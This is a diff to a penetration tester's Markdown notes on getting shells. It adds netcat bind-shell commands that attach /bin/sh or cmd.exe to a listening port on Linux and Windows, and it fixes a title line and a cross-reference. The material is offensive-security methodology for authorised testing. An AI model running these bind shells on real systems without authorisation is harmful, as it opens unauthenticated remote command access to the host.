@@ -1,10 +1,10 @@
-LPORT=<LISTENING_PORT># General - Shells
+# General - Shells
 
 The following note details the procedure and tools that can be used to leverage
 a RCE into a fully TTY shell.  
 
-For Windows credentials (password or hashes) reuse, refer to the
-Active Directory/Credentials Hunting note.
+For Windows credentials (password or hashes) reuse and direct lateral
+movements, refer to the `[Windows] Lateral movements` note.
 
 ### Detect firewall filtering
 
@@ -189,6 +189,21 @@ Command: c:\windows\system32\cmd.exe
 
 # Command to execute
 Options: /c <COMMAND>
+```
+
+### Bind Shells
+
+###### [Linux / Windows] Netcat
+
+```
+# Linux
+# If nc's "-e" option is available on the targeted system:
+nc [-4] -lvnp <PORT> -e /bin/sh &
+
+# Windows
+# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe or https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip offer a better compatibility across Windows systems
+nc.exe -lvnp <PORT> -e cmd.exe
+nc64.exe -lvnp <PORT> -e cmd.exe
 ```
 
 ### Reverse Shells
